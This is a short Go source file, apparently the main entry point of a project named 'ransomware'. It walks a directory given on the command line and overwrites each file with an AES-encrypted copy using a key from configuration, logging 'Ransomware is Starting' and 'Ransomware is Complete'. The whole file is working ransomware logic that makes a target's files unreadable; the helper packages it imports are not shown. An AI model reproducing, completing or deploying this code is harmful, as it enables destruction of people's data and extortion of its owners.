package main

import (
	"fmt"
	"ransomware/cli"
	"ransomware/config"
	"ransomware/encryption"
	"ransomware/files"
	"ransomware/logger"
)

func main() {

	files.VerifyOrCreate(config.Data.LogDir)
	Log := logger.NewLogger(config.Data.LogDir+config.Data.LogFile, true)

	defer func() {
		Log.Info("Application is Shutting Down")
	}()

	Log.Info("Application is Starting")

	if cli.GetArg("cmd") == "-e" {

		Log.Info("Ransomware is Starting")

		date, _ := files.WalkDir(cli.GetArg("option"))

		for _, f := range date {

			fileContent := files.Open(f)

			encryptedContent := encryption.AesEncrypt(config.Data.Key, fileContent)
			fmt.Println(encryptedContent)

			files.Write(f, encryptedContent)
			fmt.Println(f)

		}

		Log.Info("Ransomware is Complete")
	}
}
